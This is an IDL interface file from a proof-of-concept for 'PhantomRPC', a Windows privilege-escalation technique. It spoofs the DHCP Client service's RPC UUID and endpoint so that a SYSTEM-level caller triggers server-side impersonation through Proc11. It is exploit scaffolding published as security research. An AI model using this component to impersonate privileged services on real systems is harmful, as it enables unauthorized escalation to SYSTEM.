// ExampleInterface.idl — DHCP (dhcpcsvc6) PhantomRPC POC
//
// Mimics the RPC interface registered by the DHCP Client service on the
// ncalrpc endpoint "dhcpcsvc6".
//
// UUID 3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6 is the real DHCP Client UUID.
// Proc11 is the call made by a SYSTEM-level caller; it carries a wide-string
// argument and an in-out structure. We only need the procedure to exist so
// RpcImpersonateClient() can fire server-side.
//
// Discovered by Kaspersky (Haidar Kabibo), disclosed at Black Hat Asia 2026.
// Official POC: https://github.com/klsecservices/PhantomRPC (MIT)

[
    uuid(3c4728c5-f0ab-448b-bda1-6ce01eb0a6d6),
    version(1.0),
    pointer_default(unique)
]
interface ExampleInterface
{
    /* Structures needed by Proc11 */
    typedef struct Struct_10_t  { long m0; } Struct_10_t;
    typedef struct Struct_140_t { long m0; } Struct_140_t;
    typedef struct Struct_340_t { long m0; } Struct_340_t;
    typedef struct Struct_350_t { long m0; } Struct_350_t;
    typedef struct Struct_374_t { long m0; } Struct_374_t;
    typedef struct Struct_392_t { long m0; } Struct_392_t;
    typedef struct Struct_402_t { long m0; } Struct_402_t;
    typedef struct Struct_496_t { long m0; } Struct_496_t;
    typedef struct Struct_630_t { long m0; } Struct_630_t;

    typedef struct Struct_690_t {
        long  m0;
        long  m1;
        long  m2;
    } Struct_690_t;

    /* Stub procedures 0-10, 12-13 */
    long Proc0();
    long Proc1();
    long Proc2();
    long Proc3();
    long Proc4();
    long Proc5();
    long Proc6();
    long Proc7();
    long Proc8();
    long Proc9();
    long Proc10();

    /* Proc11 — the impersonation trigger */
    long Proc11(
        [in][unique][string] wchar_t *arg_0,
        [in, out]            struct Struct_690_t *arg_1
    );

    long Proc12();
    long Proc13();
}
